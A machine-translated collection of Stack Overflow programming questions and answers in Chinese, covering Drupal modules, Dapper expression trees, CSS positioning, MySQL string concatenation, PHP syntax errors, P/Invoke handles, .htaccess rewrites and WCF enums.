一些注意事项：

*   “package”属性“应该只被大型多模块包使用”
*   你不需要`.module`在“files”属性中声明你的模块文件。
*   暂时删除注释掉的行。如果您的模块确实需要 PHP 5.4，您可以在完成故障排除后将其重新添加。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-12-02T09:37:30.680

我通过启动我的 .info 文件解决了这个问题

```
name = First 
```

并使我的文件编码：

> 无 BOM 的 UTF-8

使用 Notpade++ 时你会发现它很容易

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-25T10:05:16.440

```
function test_example_help($path, $arg){
switch ($path) {
case "admin/help#test_example":
return '<p>' . t("test module to see how it works and shows") . '</p>';
break;
} 
```

使用 switch 语句尝试以下示例，看看它是否有效

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-11-18T13:19:33.720

尝试取出标记 php 代码结尾的**?>**。这样做是为了防止空格破坏 HTTP 标头。

# c# - 拉开表情 >

> ID：15154783
> 
> 赞同：7
> 
> 时间：2013-03-01T09:49:00.313
> 
> 标签：c#, extension-methods, dapper

我正忙于在[Dapper](https://code.google.com/p/dapper-dot-net/)和[DapperExtensions](https://github.com/tmsmith/Dapper-Extensions)之上创建包装扩展方法。目前我正在尝试将过滤添加到`GetList<T>`扩展方法中，类似于 LINQ 的`Where<T>`扩展方法。我已经看到[了这个问题](https://stackoverflow.com/questions/14585212/predicate-with-dapperextensions "带有 DapperExtensions 的谓词")，但似乎我无法实现[Marc Gravell](https://stackoverflow.com/questions/14585212/predicate-with-dapperextensions#comment-21308084)的建议，因为 .NET 4.5 中没有类型`EqualsExpression`。这是一些演示代码，可帮助解释我的问题：

```
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Data;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Linq.Expressions;
using DapperExtensions;

namespace Dapper.Extensions.Demo
{
    public class Program
    {
        private static readonly string ConnectionString = ConfigurationManager.ConnectionStrings["DapperDbContext"].ConnectionString;
        public static IDbConnection Connection { get { return new SqlConnection(ConnectionString); } }

        public static void Main(string[] args)
        {
            const int marketId = 2;
            var matchingPeople = Connection.Get<Person>(p => p.MarketId, marketId); // This works

            // Below is a LambdaExpression. expression.Body is, bizarrely, a UnaryExpression with a Convert
            //var matchingPeople = Connection.Get<Person>(p => p.MarketId == marketId); // Does not work

            foreach (var person in matchingPeople)
            {
                Console.WriteLine(person);
            }

            if (Debugger.IsAttached)
                Console.ReadLine();
        }
    }

    public static class SqlConnectionExtensions
    {
        public static IEnumerable<T> Get<T>(this IDbConnection connection, Expression<Func<T, object>> expression, object value = null) where T : class
        {
            using (connection)
            {
                connection.Open();

                // I want to be able to pass in: t => t.Id == id then:
                // Expression<Func<T, object>> expressionOnLeftOfFilterClause = t => t.Id;
                // string operator = "==";
                // object valueFromLambda = id;
                // and call Predicates.Field(expressionOnLeftOfFilterClause, Operator.Eq, valueFromLambda)

                var predicate = Predicates.Field(expression, Operator.Eq, value);
                var entities = connection.GetList<T>(predicate, commandTimeout: 30);
                connection.Close();
                return entities;
            }
        }
    }

    public class Person
    {
        public int Id { get; set; }

        public string FirstName { get; set; }

        public string Surname { get; set; }

        public int MarketId { get; set; }

        public override string ToString()
        {
            return string.Format("{0}: {1}, {2} - MarketId: {3}", Id, Surname, FirstName, MarketId);
        }
    }
} 
```

特别注意我的`Get<T>`扩展方法：当我传入`p => p.MarketId`or`p => p.MarketId == marketId`时，`expression.Body`类型为`UnaryExpression`. 对于后者，`expression.Body`实际上包含`{Convert((p.MarketId == 2))}`.

尝试

```
var binaryExpression = expression as BinaryExpression; 
```

Returns `null`，这很不幸，因为有一些我可能会发现有用的属性`Left`。`Right`

那么，有谁知道如何实现我想要的？更进一步，我希望能够`Operator`根据传入的 lambda 表达式选择枚举。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T13:56:41.423

我已经想出了如何实现我想要的。

**总之：**

1.  我需要一个扩展方法来包装 DapperExtension 的`GetList<T>`扩展方法。
2.  后者可能会接受一个类型的谓词`IFieldPredicate`，我可以使用它来将过滤器添加到要执行的 SQL 查询中。我可以通过使用`Predicates.Field<T>(Expression<Func<T, object>> expression, Operator op, object value)`.
3.  问题在于将简单的 lambda 表达式`t => t.Id == id`转换为`Predicates.Field<T>`. 因此，从概念上讲，我需要将 lambda 表达式分成三个部分：`t => t.Id`、`Operator.Eq`和`id`。

在@Iridium、@Eduard 和@Jon 的帮助下，我的最终解决方案是：

```
public static class SqlConnectionExtensions
{
    public static IEnumerable<T> Get<T>(this IDbConnection connection, Expression<Func<T, object>> expression) where T : class
    {
        using (connection)
        {
            connection.Open();

            var binaryExpression = (BinaryExpression)((UnaryExpression) expression.Body).Operand;

            var left = Expression.Lambda<Func<T, object>>(Expression.Convert(binaryExpression.Left, typeof(object)), expression.Parameters[0]);
            var right = binaryExpression.Right.GetType().GetProperty("Value").GetValue(binaryExpression.Right);
            var theOperator = DetermineOperator(binaryExpression);

            var predicate = Predicates.Field(left, theOperator, right);
            var entities = connection.GetList<T>(predicate, commandTimeout: 30);

            connection.Close();
            return entities;
        }
    }

    private static Operator DetermineOperator(Expression binaryExpression)
    {
        switch (binaryExpression.NodeType)
        {
            case ExpressionType.Equal:
                return Operator.Eq;
            case ExpressionType.GreaterThan:
                return Operator.Gt;
            case ExpressionType.GreaterThanOrEqual:
                return Operator.Ge;
            case ExpressionType.LessThan:
                return Operator.Lt;
            case ExpressionType.LessThanOrEqual:
                return Operator.Le;
            default:
                return Operator.Eq;
        }
    }
} 
```

我现在可以这样做：

```
var matchingPeople = Connection.Get<Person>(p => p.MarketId == marketId); 
```

我知道这有多脆弱——如果我传入更复杂的东西，甚至是看起来等价的东西，比如`var matchingPeople = Connection.Get<Person>(p => p.MarketId.Equals(marketId));`. 它确实解决了我 90% 的问题，所以我很乐意让它保持原样。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-01T09:55:03.893

这就是问题：

```
Expression<Func<T, object>> expression 
```

你的函数必须返回`object`。的类型`p.MarketId == marketId`是`bool`。因此它需要被装箱到`object`，因此`Convert`.

如果表达式始终是谓词，则应将其更改为：

```
Expression<Func<T, bool>> expression 
```

那时，我希望您能看到适当的二进制表达式。另一方面，那将不适用于`p => p.MarketId`...

老实说，这些参数的含义并不是很清楚。感觉就像您可能需要两种方法 - 一种用于作为谓词的*单个*参数，另一种用于*两个*参数：投影和目标值。

# iphone - 下载解析 HTML 数据的说明

> ID：15154786
> 
> 赞同：0
> 
> 时间：2013-03-01T09:49:04.697
> 
> 标签：iphone, html, objective-c, parsing

我正在开发一个 iPhone 应用程序，主要登录到第三方网站并解析 HTML 数据以获取特定信息，如日期和时间等。

但是，如果网站稍微更新其 HTML 模板，这显然很容易被打破。

我不希望应用程序崩溃，如果它发生了 - 我不想每次都向苹果发送更新。

我需要一种简单的智能方式让我的应用程序从我自己的服务器下载有关如何解析网站的“说明”。这样，如果 HTML 发生变化；我可以只更新服务器上的说明，而不是向苹果发送全新的应用程序更新。

我目前正在使用 XPath 通过库 TFHpple 来查找数据，而且还通过到达目标 c 中的 TFHppleElements 子项来查找数据。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:53:59.740

老实说，更聪明的方法可能是不仅让您的服务器发送有关如何解析网站的“指令”，还让您的服务器自己完成整个抓取并充当“中间件”。您的服务器可以进行网络抓取，将内容转换为 JSON/XML/任何内容，然后您的设备可以请求它。如果网站发生变化，您只需更新服务器，您就可以将解析从设备卸载到服务器（根据您要抓取的内容，这可以显着减少被抓取网站的负载）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T10:01:23.587

**HTML的解析**

你的代码解析任何包含 HTML 的网站是多么出色，你需要每时每刻更新。即使您在网站上做到了万无一失。问题出现了如何解析包含 HTML 的网站。

可能你会使用 NSRegularExpression、NSPredicate 等来使用。

这里有一个大讨论：[永远不要使用 RegEx 解析 HTML](https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags/1732454#1732454)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T10:28:03.757

您可以在本网站查看说明：

[最好的 XMLParser 倾注你的 iPhone 项目](http://www.raywenderlich.com/553/how-to-chose-the-best-xml-parser-for-your-iphone-project)

# html - 如何右对齐div内的固定位置div

> ID：15154790
> 
> 赞同：12
> 
> 时间：2013-03-01T09:49:27.850
> 
> 标签：html, css

我的代码是这样的。

```
<div class="outer">
    <div class="inner">some text here
    </div>
</div> 
```

CSS：

```
.outer {
    max-width:1024px;
    background-color:red;
    margin:0 auto;
}
.inner {
    width:50px;
    border:1px solid white;
    position:fixed;
} 
```

`div`默认情况下定位的内部`left`需要定位`right`在外部`div`而不是页面本身。

如果我将其设置为`right:0px;`，则它与`0px`浏览器的右侧对齐，而不是外部`div`的右侧。

注意：我的外层`div`不是固定宽度；它根据屏幕分辨率进行调整。这是一个响应式网站设计。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-01T10:29:34.397

您可以使用容器 div：

```
<div class="outer">
    <div class="floatcontainer">
        <div class="inner">some text here</div>
    </div>
</div> 
```

然后用它来处理`float`，并使其成为孩子`position: fixed`

```
.outer {
    width:50%;
    height:600px;
    background-color:red;
    margin:0 auto;
    position: relative;
}
.floatcontainer {
    float: right;
}
.inner {
    border:1px solid white;
    position:fixed;
}
.floatcontainer, .inner{
    width: 50px;
} 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-03-01T09:51:24.600

你为什么不使用`position:absolute`

`position:fixed`总是相对于浏览器

```
.outer {
    width:200px;
    height:600px;
    background-color:red;
    margin:0 auto;
    position:relative
}
.inner {
    width:50px;
    border:1px solid white;
    position:absolute; right:0
} 
```

[**演示**](http://jsfiddle.net/ZLbqn/)

* * *

如果必须使用，`position:fixed`那么您可以分配该`margin-left`值，因为您对两个 div 都使用了 fixed with。

```
.inner {
    width:50px;
    border:1px solid white;
    position:fixed; margin-left:150px
} 
```

**[演示 2](http://jsfiddle.net/ZLbqn/2/)**

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-03-01T09:53:06.080

两种选择。只需将内部 div 向右浮动，或者使用绝对定位来实现它。

对于浮动，只需在内部 DIV 上设置 float:right 并在外部 DIV 上设置 overflow:hidden。

对于绝对定位，只需在外部 DIV 上设置 position:relative 并在内部 DIV 上设置 position: absolute 和 right:0 top:0。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-11-19T10:41:51.853

我想这就是你想要的

```
<div class="outer">
    <div class="inner">some text here
    </div>
</div>

.outer {
    margin: 0 auto;
    width: 860px;
    direction: rtl;
    background-color: black;
    height: 1200px;
}

.inner {
    float: right;
    position: fixed;
    text-align: center;
    width: 220px;
    background-color: red;
    height: 50px;
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-03-01T10:20:16.317

如果您想将`.inner`元素设置为固定定位元素并将其他内容保留`.outer`为*“可滚动”*，我建议您将`.inner`位置设置为绝对定位元素。然后，在它之后创建一个新的包装器`overflow:auto`：

```
<div class="outer">
  <div class="inner">Some text here...</div>
  <div class="flow">content</div> <!-- extra markup -->
</div> 
```

这是一个演示：http: [//jsfiddle.net/tovic/ZLbqn/3/](http://jsfiddle.net/tovic/ZLbqn/3/)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-08-02T07:37:31.450

有点hacky，但它有效

```
.outer {
    width:200px;
    height:600px;
    background-color:red;
    margin:0 auto;
    direction: rtl; 
}
.inner {
    width:50px;
    border:1px solid white;
    direction: ltr;
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-10-01T08:07:35.650

以下对我有用。

```
 <div style="position: relative;">
    <div id="overlay">
        overlay content
    </div>
</div>

<style>
#overlay {
    position: absolute;
    display: block;
    top: 0;
    right: 0;
    z-index: 3;
}
</style> 
```

# php - 将不同的输入值插入一列（MySQL）

> ID：15154796
> 
> 赞同：0
> 
> 时间：2013-03-01T09:49:47.460
> 
> 标签：php, mysql, sql, forms, insert

我对 SQL 真的很陌生，我有这个小问题：

我有一个包含很多输入的页面，比如说

> 输入 1、输入 2、输入 3、输入 4

我有一张桌子

```
TABLE_A   
Col1   
Col2  
Col3 
```

我想要做的是插入`Input1`（`Col1`这是一件简单的事情），并将所有其他输入（ 2,3 和 4 ）插入`Col2`以空格或“|”分隔

如果有人可以提供帮助，那就太好了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:53:17.440

```
INSERT INTO Table_A (Col1, Col2)
VALUES ('Input1', CONCAT_WS('|', 'Input2', 'Input3', 'Input4')) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T10:05:05.280

Checkout [String Functions](http://dev.mysql.com/doc/refman/5.6/en/string-functions.html)，它为您提供了有关用“SPACE”或“|”分隔的简要知识 或者 ”，”。

在上面的链接中，使用示例检查一些功能，这些示例对您将来也有帮助。

1.  `CONCAT_WS()` 返回与分隔符连接
2.  `CONCAT()` 返回连接的字符串
3.  `ELT()` 返回索引号处的字符串
4.  `EXPORT_SET()` 返回一个字符串，这样对于值位中设置的每个位，您都会得到一个 on 字符串，对于每个未设置的位，您都会得到一个 off 字符串
5.  `FIELD()` 返回后续参数中第一个参数的索引（位置）
6.  `FIND_IN_SET()` 返回第二个参数中第一个参数的索引位置

用于`CONCAT()`将不同的输入值插入一列。

```
INSERT INTO Table_A (Col1, Col2)
VALUES ('Input1', CONCAT('|', 'Input2', 'Input3', 'Input4')) 
```

这可以帮助你。

# gtk - GTK 的主循环可以从辅助线程运行吗？

> ID：15154797
> 
> 赞同：4
> 
> 时间：2013-03-01T09:49:49.487
> 
> 标签：gtk

是否可以在辅助线程而不是主线程中运行 GTK 的主循环？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-02T13:20:04.260

是的，您可以在任何线程中使用主循环，但您只能从创建它的线程中访问它。

但是，这不是一件常见的事情，并且可能有更好的方法来做你想做的任何事情。

# ruby-on-rails - 只打印选择键，而不是所有键值对？

> ID：15154798
> 
> 赞同：1
> 
> 时间：2013-03-01T09:49:59.157
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, hash

我有一个代码，可以在其中打印所有键和哈希值。我想让它可配置，以便它只打印所需的键而不是所有键。假设我有键 k1、k2、k3...k20。我想打印 k1、k3、k8....k15、k18。解决此问题的最佳方法是什么？

这是相关的代码片段-：

```
 <%@order_items.each do |order_item|%>
        <h5>Order Item</h5>
        <%order_item.each do |key,value|%>

          <table cellspacing=2>

            <tr><td><%=key.capitalize%>: </td> <td><%= value %></td></tr>

          </table>
        <%end%>
      <%end%> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T10:01:04.610

你也可以这样做

```
<% [1,3,8,15,18].each do |key|; value = order_item[key] %> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T10:11:20.527

尝试：

```
class Hash
  def select_keys(*args)
    select {|k,v| args.include?(k) }
  end
end 
```

然后你可以打电话：

```
h.select_keys(1,3,8,15,18) 
```

或者

您可以使用：

```
hash.slice(1,3,8,15,18)
 # => { '1' => 'value1', '3' => 'value2', '8' => 'value3', '15' => 'value4', '18' => 'value5' } 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-01T09:52:22.553

有这样的东西：

```
<% order_item.select{|k,_| [1,3,8,15,18].include?(k)}.each do |key,value| %> 
```

# html - 画布保存和恢复

> ID：15154802
> 
> 赞同：0
> 
> 时间：2013-03-01T09:50:13.810
> 
> 标签：html, canvas, fabricjs

我目前正在做一个允许用户制作幻灯片的应用程序。我正在使用 fabricjs 让他们在当前幻灯片上添加文本和内容。但我希望他们也能够添加新幻灯片。

因此，当他们点击“新幻灯片”按钮时，我需要一种方法来保存和存储当前幻灯片（画布）。
另一件事是允许用户通过从列中选择它们来编辑以前的画布。

我对 html5 和 fabricjs 比较陌生，所以我真的不知道该怎么做。我尝试过使用克隆功能，但并没有真正奏效，上一个画布中的 drawImage 也是如此。

有什么想法可以帮助我开始这件事吗？

我也一直在考虑存储创建的画布的方式，我想知道数组列表是否是一个好方法。

谢谢你的帮助

tl;dr ：我想保存一个画布，清除它并在以后恢复它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T10:02:55.977

您可以使用画布序列化将画布保存为 JSON，并在以后需要时恢复画布。对于详细的教程[，这篇 fabricjs 文章](http://fabricjs.com/fabric-intro-part-3#serialization)是一个好的开始。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-25T08:58:41.963

```
ctx.fillStyle= 'red'
//  draw a rectangle with default settings
     ctx.fillRect(0,0,150,150);
     //  Save the default state
     ctx.save();   

 ctx.fillStyle = '#66FFFF'       
     ctx.fillRect( 15,15,120,120); 
     // Save the current state
    // ctx.save();

 // Restore previous state
     ctx.restore();
     ctx.fillRect(45,45,60,60); 
```

来自[http://www.tutorialspoint.com/html5/canvas_states.htm的示例](http://www.tutorialspoint.com/html5/canvas_states.htm)

# php - PHP意外文件解析错误结束

> ID：15154806
> 
> 赞同：-1
> 
> 时间：2013-03-01T09:50:49.080
> 
> 标签：php, mysql

基本上我正在用 php 和 HTML 创建一个基于事件的预订系统，代码是粗体的

```
<?php    // editappt.php    // Edit appointment calendar items    //
    List globals for reference    global $link, $result, $time, $date,
    $idx, $submit_err, $cmd, $begtime, $endtime, $subj, $notes, $idx;   
    // Return the variables from GET    function get_vars()    {
            global  $date, $time, $submit_err;
            foreach($_GET as $key => $value)
            {
                 $key = $value;
            }    }   /* Return the variables from POST -- doing this AFTER processing GET variables ensures that POST variables are not altered
    by the URL */   function post_vars()   {
        foreach($_POST as $key => $value)
        {
          global $key;
          $key = $value;
          print $value;
        }   }   // Open connection to DB   function open_db()   {
        $db = "calendar";
        $link = mysql_connect(localhost,root,"") or die("Could not connect to server! Error: ".mysql_error());
        mysql_select_db($db,$link) or die("Could not select $db! Error: ".mysql_error());
        return($link);   }   // Get the appt for the specified date and time   function get_appt($date,$time)   {
        global $link;
        $query = "SELECT * FROM appts WHERE date = '$date ' ";
        $query = $query."AND (\"$time\" >= begtime AND \"$time\" <= endtime)";
        $result = mysql_query($query,$link) or die("Query Error!<p>Query: $query<p> Error: " + mysql_error());
        // Return the results
        return($result);   }   // Print the appt form for $date   function print_appt($result)   {      print $link + $date + $time +
    $submit_err + $begtime + $endtime + $subj + $notes + $idx;   }
        // Assemble select list "name" from first to last by step
        //   match = initially selected item, time = format for time    function print_list($name,$first,$last,$step,$match,$time)    {
            print "<select name=\"$name\" size=\"1\">";
            if ($tmp == $match)
            {
                echo " selected";
                echo ">$tmp\n";
            }
                    else
                    {
                        $tmp = $x;
                    }
             for ($x = $first; $x <= $last; $x=$x+$step)
                    {
                        echo "\t<option";
                        if ($time)
                        {
                            $tmp = date("H:i",$x);
                        }
                         echo "</select>\n";
            $this_script = $_SERVER['PHP_SELF'];
        // If this isnt a redisplay because of error, init vars
        if (!$submit_err)
        {
            $begtime = $time;
            $endtime = $time;
            $subj = "";
            $notes = "";
            $idx = 0;
            $cmd = "write";
          // Get fields for appt, if one exists
          // (else use values above)
         }
        while ($line = mysql_fetch_array($result,MYSQL_ASSOC))
          {
              $begtime = substr($line[begtime],0,5);
              $endtime = substr($line[endtime],0,5);
              $subj = $line[subj];
              $notes = $line[notes];
              $idx = $line[idx];
              $cmd = "update";
          }    }  // Start form with state fields (hidden)  print <<<HTML  <html>  <body>  <form action="$this_script" method="post"> 
    <input type="hidden" name="date" value="$date">  <input
    type="hidden" name="cmd" value="$cmd">  <input type="hidden"
    name="idx" value="$idx">  <table border="0" width="100%">  HTML;   
    echo "<tr>\n\t<td colspan=\"2\">\n";    // Display date in M D and Y
    select lists    print_list("month",1,12,1,substr($date,5,2),FALSE); 
    print_list("day",1,31,1,substr($date,8,2),FALSE);    $year =
    substr($date,0,4);   
    print_list("year",$year-1,$year+2,1,$year,FALSE);    echo "<p>\n";  
    // Display beginning and ending time in two    //  select lists   
    $sttm = strtotime("00:00");    print_list("begtime",$sttm,($sttm +
    (1800*47)),1800
                  ,$begtime,TRUE);    echo "&nbsp;to&nbsp;";    print_list("endtime",$sttm,($sttm + (1800*47)),1800
                  ,$endtime,TRUE);    echo "\n</td>\n</tr>\n<tr>\n\t<td colspan=\"2\">&nbsp;";    // Print any error from last submission   
    if ($submit_err) {
         echo "<font color=\"red\">ERROR: ";
         echo "$submit_err</font>\n";    }    print "\t</td>\n</tr>\n";  // Display Subject and Notes  print <<<HTML  </select><p>  <tr>   
    <td width="10%">Subject:</td>    <td><input type="text" name="subj"
    value="$subj"
            size="40" maxlength="40"></td>  </tr>  <tr>    <td>Notes:</td>    <td>    <textarea cols="40" rows="5" name="notes"
         wrap="virtual">$notes</textarea>    </td>  </tr>  </table>  <p>  <input type="submit" name="OK" value="OK">  &nbsp;&nbsp;  <input
    type="submit" value="Cancel" onclick="self.close()">  </form> 
    </body>  </html>  HTML;  // Decode submission and write to DB  //  
    $cmd = whether to overwrite (rewrite) or insert (write)  function
    write_appt($idx,$date,$begtime,$endtime,$subj,$notes,$cmd)  { 
        global $link;    // Check to make sure beginning time doesnt run
    into another appt    $query = "SELECT idx,begtime,endtime,subj FROM
    appts WHERE date = \"$date\" AND ". "\"".$begtime."\" >= begtime AND
    \"".$begtime."\" <= endtime";    $result = mysql_query($query,$link)
    or die("Query Error!<p>Query: $query<p>Error: " mysql_error());   
    // If overlap (conflict) found, display error    while ($line =
    mysql_fetch_array($result,MYSQL_ASSOC))    {
         if ($line[idx] != $idx)
         {
           $errtext = "Conflict: ".substr($line[begtime],0,5)."-" + substr($line[endtime],0,5).":".$line[subj];
           return($errtext);
         }    }    // Check to make sure ending time doesnt run into another appt    $query = "SELECT idx,begtime,endtime,subj FROM appts
             WHERE date = \"$date\" AND ".
                "\"".$endtime."\" >= begtime AND \"".$endtime."\" <=
         endtime";    $result = mysql_query($query,$link)
         or die("Query Error!<p>Query: $query<p>Error:
               ".mysql_error());    // If overlap (conflict) found, display error    while ($line =
    mysql_fetch_array($result,MYSQL_ASSOC)) {
         if ($line[idx] != $idx) {
           $errtext = "Conflict: ".substr($line[begtime],0,5)."-".
                       substr($line[endtime],0,5)." : ".$line[subj];
           return($errtext);
         }    }    // Build appropriate query    if ($cmd == "update") {
         $query = "UPDATE appts SET
         date='$date',begtime='$begtime',endtime='$endtime',".
                    "subj='$subj',notes='$notes' WHERE idx = '$idx'";    } else {
         $query = "INSERT INTO appts VALUES
         ('0','$date','$begtime','$endtime','$subj','$notes','0')";    }    // Handle query    $result = mysql_query($query,$link)
         or die("Query Error!<p>Query: $query<p>
               Error:  ".mysql_error());  // Close page if no errors  print <<<HTML  <html>  <body>  <form>  Appointment Saved.<p>  <input
    type="button" value="Close" onclick="self.close()">  </form> 
    </body>  </html>  HTML;  }  // Main program body  $link = open_db();
    // Called with POST arguments?  //  (From another iteration of this
    script)  if (!empty($_POST))    {       $submit_err = "";   // Get POST
    data
            post_vars();    // Properly format date (leading zeros on M & D)    if (strlen($month) == 1) { $month = "0".$month; }    if
    (strlen($day) == 1)   { $day = "0".$day; }    $date =
    $year."-".$month."-".$day;    // Proper date?    if
    (!checkdate($month,$day,$year))    {
         $submit_err = "Invalid Date!";
         print_appt($result);    }    // Valid start and end times? (start < end)?    if (strtotime($begtime) > strtotime($endtime))   
    {
         $submit_err = "Invalid Start Time!";
         print_appt($result);    }    // Subject exists?    if (strlen($subj) == 0)    {
         $submit_err = "Subject is Blank!";
         print_appt($result);    }    // Attempt write and err on conflicting appt    if (!$submit_error)    {
         $conflict = write_appt($idx,$date,$begtime, $endtime,$subj,$notes,$cmd);
         if ($conflict)
         {
             $submit_err = $conflict;
             print_appt($result);
         }    } / else  {    // Called with GET arguments?    //  (From calendar)    // Get GET data and print edit form    get_vars();   
    $result = get_appt($date,$time);    print_appt($result);  }  //
    Close DB  mysql_close($link);  ?>} 
```

我在第 320 行不断收到一个语法错误，说文件意外结束，谁能告诉我如何以及在哪里修复该错误。`enter code here`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:53:11.823

尽管代码的格式很糟糕，但快速浏览一下就会告诉我它以 结尾`?>}`，什么时候应该是`}?>`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:54:27.500

在文件末尾更改

```
?>} 
```

至

```
} ?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T09:54:54.220

您的错误在此块中的某处

```
 if ($line[idx] != $idx)
         {
           $errtext = "Conflict: ".substr($line[begtime],0,5)."-" + substr($line[endtime],0,5).":".$line[subj];
           return($errtext);
         }    }    // Check to make sure ending time doesnt run into another appt    $query = "SELECT idx,begtime,endtime,subj FROM appts
             WHERE date = \"$date\" AND ".
                "\"".$endtime."\" >= begtime AND \"".$endtime."\" <=
         endtime";    $result = mysql_query($query,$link)
         or die("Query Error!<p>Query: $query<p>Error:
               ".mysql_error());    // If overlap (conflict) found, display error    while ($line =
    mysql_fetch_array($result,MYSQL_ASSOC)) {
         if ($line[idx] != $idx) { 
```

你有太多的 " 破坏了代码流，这在网站上启用代码突出显示时很明显，因为它开始将 php 着色为通常用于字符串的纯红色。

我建议你开始计算你的 " 并检查任何内联是否用 \ 等正确转义。

更具体地说，它的这一位

```
WHERE date = \"$date\" AND ".
                "\"".$endtime."\" 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T09:55:34.827

这`or die("Query Error!<p>Query: $query<p>Error: " mysql_error());` 也是一个错误。

# c# - DLL 导入中的 SafeFileHandle

> ID：15154808
> 
> 赞同：5
> 
> 时间：2013-03-01T09:51:04.790
> 
> 标签：c#, pinvoke

这是我第一次需要使用 P/Invoke 与设备驱动程序交互。在 DeviceIoControl 函数中，我使用 SafeFileHandle 作为设备句柄，[pinvoke.net](http://www.pinvoke.net/default.aspx/kernel32.CloseHandle)说：

> 如果您使用 SafeFileHandle，请不要调用 CloseHandle，因为 CLR 会为您关闭它。

但在 C# Cookbook 中，我发现了 CloseHandle 的这种签名：

```
[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool CloseHandle(SafeFileHandle hObject); 
```

真相是什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T10:15:25.920

`SafeFileHandle`内部调用`CloseHandle`其`ReleaseHandle`方法，并且设计用于与`Disposable`模式一起使用，因此您不想手动关闭句柄`CloseHandle(SafeFileHandle)`（只需调用该`Close`方法，或者`Dispose`，而不是）。

照原样`SafeFileHandle`，`sealed`我真的看不出“ `public static extern bool CloseHandle(SafeFileHandle hObject);`”签名中有任何意义。

* * *

编辑

我刚刚用谷歌搜索[了你的书](http://books.google.fr/books?id=9fAmRzYaxFgC&pg=PT922&lpg=PT922&dq=C#%20Cookbook%20closehandle%20safefilehandle&source=bl&ots=_lYv8HiuTk&sig=tkZ7NsPJxG2zCzHkIiyyVJXF9Ik&hl=en&sa=X&ei=cocwUfmMBYqy0QWp24GIBA&redir_esc=y)，找到了一个`CloseHandle(SafeFileHandle)`参考。正如预期的那样，它没有被使用，并且`SafeFileHandle`使用以下方法正确关闭：

```
private void ClosePipe() 
{ 
    if (!_handle.IsInvalid) 
    { 
        _handle.Close(); 
    } 
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T10:14:01.533

你看到的是 Win32-API 函数来关闭一个打开的`handle`. 当您使用 Win32-C/C++ 并使用系统句柄时，将使用此功能。我不能 100% 地验证上述关于 CLR 的陈述，但我想你会没事的，不要使用它。

请参阅有关Win32 的 -function的[MSDN文章。](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724211%28v=vs.85%29.aspx)`CloseHandle`

这里也有[这篇](http://msdn.microsoft.com/en-us/magazine/cc163392.aspx#S7)文章，讲的是CLR的GC。

# .htaccess - 根据 HTTP_HOST 提供不同的 robots.txt

> ID：15154818
> 
> 赞同：2
> 
> 时间：2013-03-01T09:51:26.667
> 
> 标签：.htaccess, mod-rewrite

我有两个网站都被谷歌使用相同的代码库索引：

dev.mysite.com 和 example.com

我想根据每个域提供不同的 robots.txt。

目前我有：

```
RewriteBase /

RewriteCond %{HTTP_HOST} ^dev\.mysite\.com$ [NC]
RewriteRule ^robots\.txt$ robots\.txt\.dev [L] 
```

但是，这似乎不起作用。有人可以指出我正确的方向。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-07-06T06:30:03.677

对我来说，通过添加额外条件来工作

```
RewriteCond %{HTTP_HOST} ^dev\.mysite\.com
RewriteCond %{REQUEST_URI} (robots\.txt)
RewriteRule .* robots-dev.txt [L] 
```

# c# - WCF 枚举，如果我不将成员标记为 EnumMember 怎么办？

> ID：15154828
> 
> 赞同：6
> 
> 时间：2013-03-01T09:51:51.597
> 
> 标签：c#, .net, wcf, enums

```
[DataContract]
public enum Color
{
    Red,
    Blue
}

[DataContract]
public enum Color1
{
    [EnumMember]
    Red,
    [EnumMember]
    Blue
} 
```

这两个枚举在序列化时或在客户端会被区别对待吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-01T09:55:23.397

当您将 应用于`DataContractAttribute`枚举时，您必须通过使用`EnumMemberAttribute`.

因此，在您的情况下，两个枚举将产生两个不同的合同，一个没有成员，一个有两个成员，`Red`并且`Blue`.

如果您不将 应用于`DataContractAttribute`枚举，则该枚举的所有成员都将隐含在合同中。

有关解释，请参见[此处](http://msdn.microsoft.com/en-us/library/aa347875.aspx)`Enumeration Member Values`，主要是和 `Notes on Simple Enumerations`部分。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-01T09:55:51.597

如果您不使用 EnumMember 属性标记枚举值，它将不是数据协定的一部分。这意味着它不会出现在 wsds/contract/proxies 中，并且客户端将无法使用它。

* * *

